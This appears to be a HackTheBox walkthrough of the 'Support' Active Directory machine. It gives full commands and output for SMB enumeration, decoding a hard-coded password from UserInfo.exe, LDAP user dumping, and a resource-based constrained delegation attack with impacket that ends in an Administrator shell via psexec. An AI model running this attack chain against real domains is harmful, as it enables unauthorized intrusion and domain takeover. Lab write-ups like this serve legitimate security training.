---
title: "Support"
date: 2025-06-20
categories:
  - HackTheBox
  - Active Directory
tags:
  - HackTheBox
  - Active Directory
---

# Support

![](../assets/Pasted%20image%2020250510164728.png)
<!-- more -->

## Enumeration

```bash
$ nmap -sC -sV -Pn -T4 --min-rate 5000 -p- 10.10.11.174
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-26 17:48 CET
Nmap scan report for 10.10.11.174
Host is up (0.040s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-26 16:48:53Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 2s
| smb2-time: 
|   date: 2024-11-26T16:49:45
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.46 seconds
```

We have `smb` shares

```bash
$ smbclient -U "" -L //10.10.11.174   
Password for [WORKGROUP\]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.174 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                                                                            
$ smbclient -U "" //10.10.11.174/support-tools  
Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 20 19:01:06 2022
  ..                                  D        0  Sat May 28 13:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 13:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 13:19:55 2022
  putty.exe                           A  1273576  Sat May 28 13:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 13:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 19:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 13:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 13:19:43 2022

                4026367 blocks of size 4096. 971514 blocks available
```

## Initial Access

`UserInfo.exe` seems like an internal program, let's see its interior with `dotPeek`

![](../assets/Pasted%20image%2020241126200625.png)

We have an encrypted password and an encoding key, so we have to execute that same function.

```c#
using System;
using System.Text;


class Protected
{
    private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
    private static byte[] key = Encoding.ASCII.GetBytes("armando");

    public static string getPassword()
    {
        byte[] numArray = Convert.FromBase64String(Protected.enc_password);
        byte[] bytes = numArray;
        for (int index = 0; index < numArray.Length; ++index)
        bytes[index] = (byte) ((int) numArray[index] ^ (int) Protected.key[index % Protected.key.Length] ^ 223);
        return Encoding.Default.GetString(bytes);
    }
    static void Main()
    {
        Console.WriteLine(getPassword());
    }
}
```

Put it in a `.cs` file in a folder, install `dotnet` if not installed and

```bash
csc program.cs
dotnet run
```

```bash
C:\Users\win\Desktop>dotnet run
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

If we inspect the function where the `ldap` connection is called:

![](../assets/Pasted%20image%2020241126223240.png)

The user is `support\ldap`, so we can use `ldapsearch` to enumerate all the users

```bash
$ ldapsearch -x -H ldap://support.htb -D "support\\ldap" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "CN=Users,DC=support,DC=htb" "objectClass=user"
```

Looking at all the users, we see the info field in `support`

```bash
info: Ironside47pleasure40Watchful
```

Now we have `support:Ironside47pleasure40Watchful` so let's try `evil-winrm`

```bash
*Evil-WinRM* PS C:\> whoami                                                                                           support
```

## Privilege Escalation

Enumerating with `bloodhound` we see that our user has `GenericAll` over the `dc` host so we can perform a Resource-Based Constrained Delegation as seen here: [https://github.com/tothi/rbcd-attack](https://github.com/tothi/rbcd-attack)

![](../assets/Pasted%20image%2020241127164113.png)


```bash
$ impacket-addcomputer -computer-name 'evilcomputer$' -computer-pass buenas123@ -dc-ip 10.10.11.174 support.htb/support:'Ironside47pleasure40Watchful'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account evilcomputer$ with password buenas123@.


$ python rbcd.py -f evilcomputer -t dc -dc-ip 10.10.11.174 support\\support:Ironside47pleasure40Watchful 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Starting Resource Based Constrained Delegation Attack against dc$
[*] Initializing LDAP connection to 10.10.11.174
[*] Using support\support account with password ***
[*] LDAP bind OK
[*] Initializing domainDumper()
[*] Initializing LDAPAttack()
[*] Writing SECURITY_DESCRIPTOR related to (fake) computer `evilcomputer` into msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `dc`
[*] Delegation rights modified succesfully!
[*] evilcomputer$ can now impersonate users on dc$ via S4U2Proxy


$ impacket-getST -spn cifs/dc.support.htb -impersonate Administrator -dc-ip 10.10.11.174 support.htb/evilcomputer$:buenas123@
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

Using the ticket, log in to the machine via `psexec`.

```bash
$ KRB5CCNAME=/home/kali/support/Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache  impacket-psexec -k dc.support.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on dc.support.htb.....
[*] Found writable share ADMIN$
[*] Uploading file aqaqcjvd.exe
[*] Opening SVCManager on dc.support.htb.....
[*] Creating service DCKN on dc.support.htb.....
[*] Starting service DCKN.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.
```

## Post Exploitation

Get the flag

```shell
C:\Windows\system32> type C:\Users\Administrator\desktop\root.txt
833c01f16a54a30451cbf1250366ba41
```
